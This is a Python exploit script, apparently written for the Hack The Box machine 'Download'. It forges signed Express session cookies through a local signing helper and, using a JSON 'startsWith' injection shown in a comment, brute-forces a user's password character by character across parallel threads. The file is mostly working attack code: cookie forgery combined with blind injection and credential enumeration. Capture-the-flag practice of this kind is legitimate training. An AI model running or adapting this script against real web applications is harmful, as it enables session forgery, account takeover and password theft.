#!/usr/bin/python3

import textwrap
description=textwrap.dedent('''\
Run this script alongside https://github.com/4wayhandshake/Express-Cookie-Signer.

(Used for HTB box: "Download")

1. This script generates JSON-like payloads, url-encodes them, and submits them
   to http://localhost:3000/auth/api for signing.
2. localhost:3000 responds with the two forged cookies.
3. This script sends a request to the actual target (http://download.htb/home)
   using the two forged cookies.
4. The target responds.
5. This script parses the response to check if the payload was "valid"
''')

import requests
import urllib.parse
import string
import itertools
import threading
import argparse
import time

parser = argparse.ArgumentParser(
    prog='EnumerateSignedCookie.py',
    formatter_class=argparse.RawDescriptionHelpFormatter,
    description=description,
    epilog='Author: 4wayhandshake 🤝🤝🤝🤝')

parser.add_argument('target', help='The URL of the target, Ex. "http://attack-me.htb/login/")', type=str)
parser.add_argument('test_object',
    help='a JSON-like object containing the FUZZ keyword, Ex. \'{"username":"admin", "password":FUZZ}\'', type=str)
# This is a false-by-default boolean flag:
parser.add_argument('--hex-only', action="store_true", dest="hex_only", help='Use hexadecimal characters only')
parser.add_argument('--verbose', action="store_true", dest="verbose", help='Print each request')
parser.add_argument('--contains', dest="does_contain", help='a "successful" attempt must contain this string.', type=str)
parser.add_argument('--omits',    dest="does_not_contain", help='a "successful" attempt must NOT contain this string.', type=str)
args = parser.parse_args()
print(" ")

def submitJsonForSigning2(jsonString):
    resp = requests.get(
        'http://localhost:3000/auth/api',
        params = urllib.parse.urlencode({"user": jsonString}), # GET params
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    )
    return {
        "download_session": resp.cookies.get("download_session"),
        "download_session.sig": resp.cookies.get("download_session.sig"),
    }

def testTarget(cookies):
    ''' Request GET /home from the target. Return boolean: success of payload '''
    url = 'http://download.htb/home/'
    resp = requests.get(url, cookies=cookies)
    num_lines = len(resp.text.split('\n'))
    result = (resp.status_code, num_lines, resp.text)
    if (args.verbose):
        print(f'{result[0]} - {result[1]}\n{result[2]}')
    return result

def success(result):
    ''' Return True if the payload was "successful" '''
    (status, num_lines, body) = result
    #return (status == 200) and ('Hey WESLEY' in body) and ('No files found' not in body)
    if status != 200:
        return False
    if (args.does_contain is not None) and (args.does_contain not in body):
        return False
    if (args.does_not_contain is not None) and (args.does_not_contain in body):
        return False
    return True

def outputLine(s):
    print(' ' * 64, end='\r') # Clear the line
    print(f'> {s}', end='\r')

def testWorker(known, c):
    global known_password
    test = args.test_object.replace('FUZZ', f'{known}{c}')
    #test = '{ "user": { "id": 1, "username": "WESLEY", "password":{"startsWith":"%s%s"}}, "flashes": { "info": [], "error": [], "success": [ "You are now logged in." ] } }' % (known, c)
    cookies = submitJsonForSigning2(test)
    result = testTarget(cookies)
    if success(result):
        with lock:
            outputLine(f'{known}{c}')
            known_password += c

if args.hex_only:
    alphabet = '0123456789abcdef'
else:
    alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits + '!@#$^&*()-+.' # don't include '%'

known_password = ''     # known portion of password so far
lock = threading.Lock() # avoid race condition between the threads
start_time = time.time()
while(True):
    char_seq = itertools.cycle(alphabet)
    threads = [] # Start again with a new list of threads
    known_password_old = known_password # Cache the old known password
    for i in range(len(alphabet)):
        c = next(char_seq)
        t = threading.Thread(target=testWorker, args=(known_password_old,c,))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()
    if known_password == known_password_old:
        break

outputLine('') # Clear off the line, to report final output
if (len(known_password) > 0):
    print(f'✅ Found: "{known_password}" in {(time.time() - start_time):.1f}s')
else:
    print('❎ No match found.')
